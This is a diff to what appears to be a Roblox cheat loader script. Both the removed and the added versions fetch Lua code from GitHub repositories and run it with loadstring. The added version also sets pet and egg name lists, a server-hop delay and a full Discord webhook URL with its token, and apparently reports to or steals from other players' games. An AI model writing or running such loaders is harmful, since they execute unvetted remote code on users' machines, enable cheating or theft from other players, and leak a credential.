@@ -1,12 +1,19 @@
-repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
 
-local scripts = {
-    [126884695634066] = "https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Garden/Garden-V1.lua",
-    [81440632616906] = "https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/DigEarth/V1.lua",
+Pets = {
+    "Disco Bee",
+    "Butterfly",
+    "Queen Bee",
+    "Raccoon",
+    "Dragonfly",
+    "Red Fox"
 }
-
-local url = scripts[game.PlaceId]
-if url then
-    loadstring(game:HttpGetAsync(url))()
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/untitled.lua"))()
-end
+Eggs = {
+    "Anti Bee Egg",
+    "Bee Egg",
+    "Night Egg",
+    "Bug Egg",
+    "Mythical Egg"
+}
+Webhook = "https://discord.com/api/webhooks/1381902488357179463/7yFnGd4vvxHzuqbq0WP5EAW6wt5fygsIRO_D2EcFG_6djY-CIkkSMQFLMuf9nzmKJ29v"
+DelayBeforeHop = 0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/PetSelector/refs/heads/main/GaG"))()
